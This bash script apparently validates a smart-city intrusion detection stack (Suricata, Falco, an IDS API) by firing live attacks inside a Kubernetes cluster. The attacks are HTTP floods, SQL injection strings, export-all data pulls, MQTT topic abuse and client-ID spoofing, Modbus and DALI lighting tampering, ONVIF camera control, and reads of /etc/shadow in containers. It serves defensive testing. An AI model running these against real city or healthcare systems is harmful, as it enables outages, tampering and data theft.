#!/usr/bin/env bash
# =============================================================================
# Smart City IDS - Live Attack Scenario Runner
#
# Runs REAL traffic + runtime behaviors inside the Kubernetes cluster to trigger
# Suricata (network) and Falco (runtime) detections end-to-end.
#
# No synthetic alert injection into the IDS API.
# Generates real cluster traffic and runtime behavior for detection validation.
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

source "$SCRIPT_DIR/lib/script-utils.sh"

NAMESPACE="smart-city"
DURATION="30"
MODE="all"   # all|ddos|sqli|privesc|exfil|mqtt|protocol
EXPLAIN="1"
VERBOSE="0"
DRY_RUN="0"
SHOW_ALERTS="3"

while [[ $# -gt 0 ]]; do
  case "$1" in
    --namespace) NAMESPACE="$2"; shift 2 ;;
    --duration) DURATION="$2"; shift 2 ;;
    --mode) MODE="$2"; shift 2 ;;
    --no-explain) EXPLAIN="0"; shift ;;
    --verbose) VERBOSE="1"; shift ;;
    --dry-run) DRY_RUN="1"; shift ;;
    --show-alerts) SHOW_ALERTS="$2"; shift 2 ;;
    --help)
      echo "Usage: bash scripts/run-live-attacks.sh [--duration SEC] [--mode all|ddos|sqli|privesc|exfil|mqtt|protocol] [--namespace smart-city] [--verbose] [--dry-run] [--no-explain] [--show-alerts N]"
      exit 0
      ;;
    *) die "Unknown option: $1" ;;
  esac
done

[[ "$DURATION" =~ ^[0-9]+$ ]] || die "--duration must be an integer"
[[ "$DURATION" -ge 5 ]] || die "--duration must be >= 5 seconds"
[[ "$SHOW_ALERTS" =~ ^[0-9]+$ ]] || die "--show-alerts must be an integer"
[[ "$MODE" =~ ^(all|ddos|sqli|privesc|exfil|mqtt|protocol)$ ]] || die "--mode must be one of: all|ddos|sqli|privesc|exfil|mqtt|protocol"

ensure_commands kubectl awk python3
ensure_kubeconfig

vlog() { [[ "$VERBOSE" == "1" ]] && log_info "$*" || true; }

emit_scenario_metadata() {
  cat <<'EOF'
Attack scenario mapping:
  ddos    -> HTTP flood / service pressure (MITRE ATT&CK: T1498 Network DoS-like behavior)
  sqli    -> SQL injection payload delivery against HTTP APIs (application attack semantics)
  privesc -> Suspicious shell + sensitive file access in containers (runtime abuse / credential access)
  exfil   -> Export-style requests + file/env reads (collection/exfiltration behavior indicators)
  mqtt    -> MQTT topic abuse (wildcard subscribe, unauthorized publish, client-ID spoof churn)
  protocol-> protocol-state tamper paths (MQTT parking control, Modbus AQI write, DALI blackout)

Realism notes:
  - Real in-cluster HTTP requests are sent to running services (ClusterIP DNS).
  - Real kubectl exec commands run inside pods to trigger Falco runtime telemetry.
  - Some network detections are signature-based on crafted payloads (e.g., SQLi strings) and may not execute a real backend exploit.
EOF
}

if ! kubectl get ns "$NAMESPACE" >/dev/null 2>&1; then
  die "Namespace not found: $NAMESPACE"
fi

log_section "Live Attack Runner"
log_info "Namespace: $NAMESPACE"
log_info "Duration:  ${DURATION}s"
log_info "Mode:      $MODE"
log_info "Verbose:   ${VERBOSE}"
log_info "Dry run:   ${DRY_RUN}"
if [[ "$EXPLAIN" == "1" ]]; then
  IDS_EXAMPLE_BASE="${IDS_API_URL:-http://localhost:30800}"
  echo "Purpose: generate real in-cluster traffic and runtime behavior so Suricata/Falco create alerts."
  echo "This is a controlled evaluation scenario; it does not use synthetic IDS alert injection."
  emit_scenario_metadata
  echo ""
  echo "Verification commands:"
  echo "  curl -s ${IDS_EXAMPLE_BASE}/api/alerts?limit=5 | jq ."
  echo "  curl -s ${IDS_EXAMPLE_BASE}/api/rate-limiter/status | jq ."
  echo "  kubectl logs -n falco-system -l app=falco --tail=20"
fi

require_deploy() {
  local dep="$1"
  kubectl get deploy "$dep" -n "$NAMESPACE" >/dev/null 2>&1 || die "Missing deployment: $NAMESPACE/$dep"
}

require_deploy traffic-camera
require_deploy healthcare-api
require_deploy parking-system
if [[ "$MODE" == "all" || "$MODE" == "mqtt" ]]; then
  require_deploy mqtt-broker
fi
require_deploy ids-api
if [[ "$MODE" == "all" || "$MODE" == "protocol" ]]; then
  require_deploy env-sensor
  require_deploy street-lighting
fi

# Pin one IDS API pod so all before/after reads come from the same process.
IDS_API_POD="$(
  kubectl get pods -n "$NAMESPACE" -l app=ids-api -o json 2>/dev/null \
    | python3 -c 'import json,sys; d=json.load(sys.stdin); items=d.get("items",[]); 
def ready(p):
    if p.get("status",{}).get("phase") != "Running": return False
    for c in p.get("status",{}).get("conditions",[]):
        if c.get("type")=="Ready" and c.get("status")=="True": return True
    return False
cands=[p for p in items if ready(p)]
cands.sort(key=lambda p: p.get("metadata",{}).get("creationTimestamp",""))
print((cands[-1]["metadata"]["name"] if cands else ""))' 2>/dev/null || true
)"
[[ -n "$IDS_API_POD" ]] || die "Could not find a running ids-api pod"
log_info "IDS API pod (pinned): ${IDS_API_POD}"

log_subsection "Baseline IDS alert counter"
BASELINE_ALERTS="$(kubectl exec -n "$NAMESPACE" "$IDS_API_POD" -- sh -lc "curl -s localhost:8000/api/metrics" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print((d if isinstance(d,dict) else {}).get(\"total_alerts\",0))' 2>/dev/null || echo 0)"
log_info "alerts_received_total (baseline, approx): ${BASELINE_ALERTS}"
BASELINE_PERSISTED="$(kubectl exec -n "$NAMESPACE" "$IDS_API_POD" -- sh -lc "curl -s localhost:8000/api/alerts?limit=1" 2>/dev/null | python3 -c 'import json,sys; \
d=json.load(sys.stdin); \
print((d if isinstance(d,dict) else {}).get(\"total\",0))' 2>/dev/null || echo 0)"
BASELINE_THROTTLED="$(kubectl exec -n "$NAMESPACE" "$IDS_API_POD" -- sh -lc "curl -s localhost:8000/api/rate-limiter/status" 2>/dev/null | python3 -c 'import json,sys; \
d=json.load(sys.stdin); \
print(((d.get(\"stats\") or {}).get(\"total_throttled\",0)) if isinstance(d,dict) else 0)' 2>/dev/null || echo 0)"

ATTACK_POD="live-attack-runner"

cleanup() {
  kubectl delete pod "$ATTACK_POD" -n "$NAMESPACE" --ignore-not-found >/dev/null 2>&1 || true
}
trap cleanup EXIT

log_subsection "Launching ephemeral in-cluster runner pod"
if [[ "$DRY_RUN" == "1" ]]; then
  log_warn "Dry-run enabled: runner pod will not be created and no traffic/runtime actions will be executed."
else
kubectl delete pod "$ATTACK_POD" -n "$NAMESPACE" --ignore-not-found >/dev/null 2>&1 || true

kubectl run "$ATTACK_POD" -n "$NAMESPACE" \
  --image=python:3.11-slim \
  --restart=Never \
  --labels=app=live-attack-runner \
  --command -- /bin/sh -lc 'sleep 3600' >/dev/null

kubectl wait --for=condition=Ready pod/$ATTACK_POD -n "$NAMESPACE" --timeout=120s >/dev/null || die "Attack runner pod failed to become Ready"

log_subsection "Installing in-pod deps (httpx + paho-mqtt)"
kubectl exec -n "$NAMESPACE" "$ATTACK_POD" -- /bin/sh -lc 'python -V && pip -q install --no-cache-dir httpx paho-mqtt' 2>/dev/null
fi

run_http_attacks() {
  local duration="$1"
  local mode="$2"
  if [[ "$DRY_RUN" == "1" ]]; then
    echo "DRY-RUN: would execute in-cluster HTTP attack traffic for ${duration}s (mode=${mode}) from pod ${ATTACK_POD}"
    echo "  Targets: traffic-camera-service, healthcare-api-service, parking-system-service"
    return 0
  fi

  # Run from inside the cluster so service DNS resolves (ClusterIP Services).
  vlog "Executing HTTP traffic generation in pod ${ATTACK_POD} against ClusterIP services"
  kubectl exec -i -n "$NAMESPACE" "$ATTACK_POD" -- \
    env DURATION="$duration" MODE="$mode" \
    python - <<'PY' >/dev/null || true
import asyncio
import os
import random
import time

import httpx

duration = int(os.environ.get("DURATION", "30"))
mode = os.environ.get("MODE", "all")

services = {
    # Use ClusterIP Services (stable DNS) rather than pod/deployment names.
    "traffic": "http://traffic-camera-service:80",
    "health": "http://healthcare-api-service:80",
    "park": "http://parking-system-service:80",
}


async def ddos() -> None:
    url = services["traffic"] + "/api/stream"
    end = time.time() + duration
    async with httpx.AsyncClient(timeout=2.0) as client:
        sent = 0
        while time.time() < end:
            # Burst windows + jitter look more realistic than fixed-rate loops.
            burst = random.choice([18, 24, 32, 48, 60]) if mode == "all" else random.choice([30, 45, 60])
            tasks = [client.get(url, params={"frame_id": sent + i, "client": f"cam{(sent+i)%7}"}) for i in range(burst)]
            await asyncio.gather(*tasks, return_exceptions=True)
            sent += burst
            await asyncio.sleep(random.uniform(0.15, 0.9))


async def sqli() -> None:
    url = services["health"] + "/api/patients"
    payloads = [
        "1' OR '1'='1",
        "admin'; DROP TABLE patients; --",
        "' OR 1=1 --",
        "1' UNION SELECT * FROM users --",
    ]
    end = time.time() + duration
    async with httpx.AsyncClient(timeout=3.0) as client:
        n = 0
        while time.time() < end:
            p = payloads[n % len(payloads)]
            try:
                # Blend obvious payloads with benign-looking keys and jittered timing.
                await client.post(url, json={"patient_id": p, "query": p, "client_ref": f"mobile-{n%5}", "trace": str(n)})
            except Exception:
                pass
            n += 1
            await asyncio.sleep(random.uniform(0.08, 0.6))


async def exfil() -> None:
    url = services["park"] + "/api/payments"
    end = time.time() + duration
    async with httpx.AsyncClient(timeout=5.0) as client:
        while time.time() < end:
            try:
                await client.get(
                    url,
                    params={
                        "action": "export_all",
                        "format": random.choice(["csv", "json"]),
                        "include_sensitive": "true",
                        "session": f"gw-{random.randint(100,999)}",
                    },
                )
            except Exception:
                pass
            await asyncio.sleep(random.uniform(0.3, 1.4))


async def unauthorized() -> None:
    targets = [
        services["traffic"] + "/api/analyze",
        services["health"] + "/api/records",
        services["park"] + "/api/reservations",
    ]
    end = time.time() + duration
    async with httpx.AsyncClient(timeout=3.0) as client:
        while time.time() < end:
            batch = random.sample(targets, k=random.randint(1, len(targets)))
            await asyncio.gather(
                *[client.get(t, headers={"Authorization": random.choice(['Bearer invalid','Bearer expired',''])}) for t in batch],
                return_exceptions=True,
            )
            await asyncio.sleep(random.uniform(0.2, 1.0))


async def main() -> None:
    tasks = []
    if mode in ("all", "ddos"):
        tasks.append(ddos())
    if mode in ("all", "sqli"):
        tasks.append(sqli())
    if mode in ("all", "exfil"):
        tasks.append(exfil())
    if mode == "all":
        tasks.append(unauthorized())
    await asyncio.gather(*tasks)


asyncio.run(main())
PY
}

run_mqtt_attacks() {
  local duration="$1"
  local mode="$2"
  if [[ "$mode" != "all" && "$mode" != "mqtt" && "$mode" != "protocol" ]]; then
    return 0
  fi
  if [[ "$DRY_RUN" == "1" ]]; then
    echo "DRY-RUN: would execute MQTT abuse traffic for ${duration}s from pod ${ATTACK_POD}"
    echo "  Behaviors: wildcard subscribe traversal, unauthorized control publishes, client-ID spoof reconnect churn"
    return 0
  fi

  vlog "Executing MQTT abuse sequence in pod ${ATTACK_POD} against mqtt-broker:1883"
  kubectl exec -i -n "$NAMESPACE" "$ATTACK_POD" -- \
    env DURATION="$duration" MQTT_BROKER="mqtt-broker" MQTT_PORT="1883" \
    python - <<'PY' >/dev/null || true
import json
import os
import random
import string
import time

import paho.mqtt.client as mqtt

duration = int(os.environ.get("DURATION", "30"))
broker = os.environ.get("MQTT_BROKER", "mqtt-broker")
port = int(os.environ.get("MQTT_PORT", "1883"))
end = time.time() + duration

control_topics = [
    "smartcity/lighting/control/all",
    "smartcity/parking/zone-a/command",
    "smartcity/env/control/station-01",
]
wildcard_topics = ["#", "smartcity/#", "iot/#", "smartcity/+/+/+"]
spoof_ids = ["traffic-camera-001", "parking-gateway-01", "streetlight-gateway-01"]


def rand_id(prefix: str) -> str:
    suffix = "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(6))
    return f"{prefix}-{suffix}"


def connect(client_id: str):
    c = mqtt.Client(client_id=client_id, clean_session=True, protocol=mqtt.MQTTv311)
    try:
        c.connect(broker, port, keepalive=20)
        c.loop_start()
        return c
    except Exception:
        return None


def close_client(c):
    if not c:
        return
    try:
        c.loop_stop()
    except Exception:
        pass
    try:
        c.disconnect()
    except Exception:
        pass


pub = connect(rand_id("mqtt-pub"))
sub = connect(rand_id("mqtt-sub"))

try:
    while time.time() < end:
        if sub:
            # Topic traversal + subscribe pressure with realistic jitter.
            sub.subscribe(random.choice(wildcard_topics), qos=0)
            if random.random() < 0.35:
                sub.subscribe(f"smartcity/{random.choice(['parking','traffic','health'])}/#")

        if pub:
            payload = {
                "cmd": random.choice(["dim", "reset", "override"]),
                "value": random.randint(0, 100),
                "source": random.choice(["gw-a", "gw-b", "unknown-client"]),
                "ts": time.time(),
            }
            pub.publish(
                random.choice(control_topics),
                payload=json.dumps(payload),
                qos=random.choice([0, 1]),
                retain=random.choice([False, True]),
            )

        # Client-ID spoof churn: two fast sessions with same client ID.
        if random.random() < 0.45:
            spoof = random.choice(spoof_ids)
            c1 = connect(spoof)
            c2 = connect(spoof)
            time.sleep(random.uniform(0.02, 0.14))
            close_client(c2)
            close_client(c1)

        time.sleep(random.uniform(0.01, 0.18))
finally:
    close_client(pub)
    close_client(sub)
PY
}

run_protocol_tamper_attacks() {
  local duration="$1"
  local mode="$2"
  if [[ "$mode" != "all" && "$mode" != "protocol" ]]; then
    return 0
  fi
  if [[ "$DRY_RUN" == "1" ]]; then
    echo "DRY-RUN: would execute protocol-state tamper activity for ${duration}s"
    echo "  Paths: parking MQTT occupancy override, env Modbus register write, DALI blackout command, ONVIF camera control/scrape"
    return 0
  fi

  vlog "Executing protocol-state tamper sequence against parking, env-sensor, street-lighting, and traffic-camera services"
  kubectl exec -i -n "$NAMESPACE" "$ATTACK_POD" -- \
    env DURATION="$duration" \
    python - <<'PY' >/dev/null || true
import json
import os
import random
import time
import httpx
import paho.mqtt.client as mqtt

duration = int(os.environ.get("DURATION", "30"))
end = time.time() + duration

def mqtt_burst():
    client_id = f"tamper-{int(time.time())}"
    c = mqtt.Client(client_id=client_id, clean_session=True, protocol=mqtt.MQTTv311)
    c.connect("mqtt-broker", 1883, 20)
    c.loop_start()
    try:
        payloads = [
            ("smartcity/parking/control/all", {"action": "reserve"}),
            ("smartcity/parking/downtown/LOT_A/command", {"action": "fault"}),
            ("smartcity/parking/downtown/LOT_B/command", {"action": "occupied", "duration_s": 900}),
        ]
        for topic, payload in payloads:
            c.publish(topic, json.dumps(payload), qos=1, retain=True)
            time.sleep(0.2)
    finally:
        c.loop_stop()
        c.disconnect()

def http_tamper():
    with httpx.Client(timeout=5.0) as client:
        client.post(
            "http://env-sensor-service/modbus/write",
            json={
                "unit_id": random.choice([1, 2, 3]),
                "duration_s": 600,
                "registers": {"0": 355, "3": 780, "14": 184, "15": 2},
            },
        )
        client.post(
            "http://street-lighting-service/dali/command",
            json={"address": "broadcast", "command": 0x00, "override_minutes": 8},
        )

def onvif_tamper():
    soap_headers = {"Content-Type": "application/soap+xml; charset=utf-8"}
    get_caps = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tds="http://www.onvif.org/ver10/device/wsdl">
  <soap:Body><tds:GetCapabilities><tds:Category>All</tds:Category></tds:GetCapabilities></soap:Body>
</soap:Envelope>"""
    get_profiles = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:trt="http://www.onvif.org/ver10/media/wsdl">
  <soap:Body><trt:GetProfiles/></soap:Body>
</soap:Envelope>"""
    move = """<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:tptz="http://www.onvif.org/ver20/ptz/wsdl" xmlns:tt="http://www.onvif.org/ver10/schema">
  <soap:Body>
    <tptz:AbsoluteMove>
      <tptz:ProfileToken>profile_1</tptz:ProfileToken>
      <tptz:Position>
        <tt:PanTilt x="0.85" y="-0.45"/>
        <tt:Zoom x="0.95"/>
      </tptz:Position>
    </tptz:AbsoluteMove>
  </soap:Body>
</soap:Envelope>"""
    with httpx.Client(timeout=5.0) as client:
        client.post("http://traffic-camera-service/onvif/device_service", content=get_caps, headers=soap_headers)
        client.post("http://traffic-camera-service/onvif/media_service", content=get_profiles, headers=soap_headers)
        client.post("http://traffic-camera-service/onvif/ptz_service", content=move, headers=soap_headers)
        client.get("http://traffic-camera-service/snap.jpg")
        client.get("http://traffic-camera-service/api/anpr/detections")

while time.time() < end:
    mqtt_burst()
    http_tamper()
    onvif_tamper()
    time.sleep(random.uniform(2.0, 5.0))
PY
}

run_runtime_attacks() {
  local duration="$1"
  if [[ "$MODE" == "mqtt" || "$MODE" == "protocol" ]]; then
    vlog "Skipping runtime phase for ${MODE}-only mode"
    return 0
  fi
  if [[ "$DRY_RUN" == "1" ]]; then
    echo "DRY-RUN: would execute runtime attack behaviors for ${duration}s via kubectl exec in namespace ${NAMESPACE}"
    echo "  Falco triggers targeted: shell-in-container, sensitive file reads, tooling/package-manager probes"
    return 0
  fi
  local end
  end=$(( $(date +%s) + duration ))

  # Runtime behaviors intended to trip Falco rules (exec shells, read sensitive files).
  # These execute inside the service pods (real runtime telemetry), not via IDS API.
  local i=0
  while [[ $(date +%s) -lt $end ]]; do
    i=$((i+1))
    # Privilege escalation-ish behavior: spawn shell and read sensitive files
    if [[ "$MODE" == "all" || "$MODE" == "privesc" ]]; then
      kubectl exec -n "$NAMESPACE" deploy/healthcare-api -- /bin/sh -lc '
        id; uname -a;
        cat /etc/shadow >/dev/null 2>&1 || true;
        cat /etc/passwd >/dev/null 2>&1 || true;
        test -f /usr/bin/curl && curl -s http://parking-system-service/api/gateway >/dev/null 2>&1 || true;
        test -f /usr/bin/wget && wget -qO- http://traffic-camera-service/health >/dev/null 2>&1 || true
      ' >/dev/null 2>&1 || true
    fi

    # Exfil-ish behavior: list /tmp and read common files
    if [[ "$MODE" == "all" || "$MODE" == "exfil" ]]; then
      kubectl exec -n "$NAMESPACE" deploy/parking-system -- /bin/sh -lc '
        ls -la /tmp >/dev/null 2>&1 || true;
        cat /etc/passwd >/dev/null 2>&1 || true;
        env | head -5 >/dev/null 2>&1 || true;
        (which apt-get && apt-get --version >/dev/null 2>&1) || (which apk && apk --version >/dev/null 2>&1) || true
      ' >/dev/null 2>&1 || true
    fi

    # Noise in traffic-camera
    if [[ "$MODE" == "all" || "$MODE" == "ddos" ]]; then
      kubectl exec -n "$NAMESPACE" deploy/traffic-camera -- /bin/sh -lc 'echo probe >/dev/null' >/dev/null 2>&1 || true
    fi
    sleep $(( (RANDOM % 3) + 1 ))
  done
}

log_section "Phase 1 - Network Attacks (Suricata)"
if [[ "$EXPLAIN" == "1" ]]; then
  echo "Phase objective: generate network telemetry aligned to real attacker behaviors"
  echo "  - HTTP flood pressure against streaming endpoint (availability impact)"
  echo "  - SQL injection payload delivery against healthcare API routes (data integrity/confidentiality intent)"
  echo "  - export/exfil-style request patterns against parking/payment endpoints (collection/exfil intent)"
  echo "  - MQTT wildcard subscribe / unauthorized publish / client-ID spoof churn (broker abuse behavior)"
  echo "  - protocol-state tamper against parking MQTT, env Modbus registers, and DALI lighting control"
  echo "Expected detector reaction: Suricata custom + threshold rules"
  echo "Expected IDS behavior: ingest -> dedup/throttle -> LLM analysis (or cached analysis) -> governance"
fi
vlog "Phase 1 executes real HTTP requests from in-cluster runner pod to ClusterIP services"
run_http_attacks "$DURATION" "$MODE"
run_mqtt_attacks "$DURATION" "$MODE"
run_protocol_tamper_attacks "$DURATION" "$MODE"
log_info "Network attack traffic complete"

log_section "Phase 2 - Runtime Behaviors (Falco)"
if [[ "$EXPLAIN" == "1" ]]; then
  echo "Phase objective: generate runtime telemetry aligned to operator abuse / post-compromise activity"
  echo "  - shell commands inside service containers"
  echo "  - reads of sensitive files (/etc/passwd, /etc/shadow)"
  echo "  - operator tooling / package-manager probes (curl/wget/apt/apk)"
  echo "Expected detector reaction: Falco runtime/eBPF syscall rules"
  echo "Expected IDS behavior: ingest -> severity/threat analysis -> governance decision / action queue"
fi
vlog "Phase 2 executes real kubectl exec commands in service deployments"
run_runtime_attacks "$DURATION"
log_info "Runtime behaviors complete"

log_section "Phase 3 - Quick IDS Metrics Check"
if [[ "$DRY_RUN" == "1" ]]; then
  echo "DRY-RUN: metrics validation skipped (no traffic was executed)."
  exit 0
fi
sleep 5
after="$(kubectl exec -n "$NAMESPACE" "$IDS_API_POD" -- sh -lc "curl -s localhost:8000/api/metrics" 2>/dev/null | python3 -c 'import json,sys; d=json.load(sys.stdin); print((d if isinstance(d,dict) else {}).get(\"total_alerts\",0))' 2>/dev/null || echo 0)"
delta=$(( after - BASELINE_ALERTS ))

echo "Alerts received (delta, approx): +${delta}"

PERSISTED_AFTER="$(kubectl exec -n "$NAMESPACE" "$IDS_API_POD" -- sh -lc "curl -s localhost:8000/api/alerts?limit=1" 2>/dev/null | python3 -c 'import json,sys; \
d=json.load(sys.stdin); \
print((d if isinstance(d,dict) else {}).get(\"total\",0))' 2>/dev/null || echo 0)"
THROTTLED_AFTER="$(kubectl exec -n "$NAMESPACE" "$IDS_API_POD" -- sh -lc "curl -s localhost:8000/api/rate-limiter/status" 2>/dev/null | python3 -c 'import json,sys; \
d=json.load(sys.stdin); \
print(((d.get(\"stats\") or {}).get(\"total_throttled\",0)) if isinstance(d,dict) else 0)' 2>/dev/null || echo 0)"
RL_STATUS="$(kubectl exec -n "$NAMESPACE" "$IDS_API_POD" -- sh -lc "curl -s localhost:8000/api/rate-limiter/status" 2>/dev/null | python3 -c 'import json,sys; \
d=json.load(sys.stdin); \
print((d.get(\"status\") if isinstance(d,dict) else \"unknown\"))' 2>/dev/null || echo unknown)"
persisted_delta=$(( PERSISTED_AFTER - BASELINE_PERSISTED ))
throttled_delta=$(( THROTTLED_AFTER - BASELINE_THROTTLED ))
echo "Persisted alerts (main table) delta: +${persisted_delta}"
if [[ "$persisted_delta" -gt 0 || "$delta" -gt 0 ]]; then
  log_info "Detection pipeline responded during the run (new alerts observed)."
else
  log_warn "No alert increase observed. Check Suricata/Falco forwarders and IDS API ingestion."
fi
if [[ "$throttled_delta" -gt 0 ]]; then
  log_info "Throttled duplicates suppressed: +${throttled_delta} (rate limiter: ${RL_STATUS})"
else
  echo "Throttled duplicates suppressed: +0"
fi

if [[ "$SHOW_ALERTS" -gt 0 ]]; then
  log_subsection "Recent alerts (sample from IDS API)"
  kubectl exec -n "$NAMESPACE" "$IDS_API_POD" -- sh -lc \
    "curl -s localhost:8000/api/alerts?limit=${SHOW_ALERTS}" 2>/dev/null \
    | python3 -c '
import json, sys
try:
    data = json.load(sys.stdin)
except Exception:
    sys.exit(0)
items = data if isinstance(data, list) else data.get("alerts", data.get("items", []))
for i, a in enumerate(items[:50], 1):
    rule = a.get("rule") or a.get("title") or "Unknown alert"
    sev = a.get("severity", "?")
    src = a.get("source", "?")
    print(f"  {i}. [{src}] sev={sev}  {rule}")
' 2>/dev/null || true
fi

if [[ "$EXPLAIN" == "1" ]]; then
  echo ""
  echo "Summary:"
  echo "  1) Real cluster actions/traffic were executed (not synthetic alert injection)."
  echo "  2) Falco and/or Suricata produced detections from runtime/network telemetry."
  echo "  3) IDS API ingested, processed, and exposed the resulting alerts via metrics/API."
fi
log_info "Attack scenario run finished"
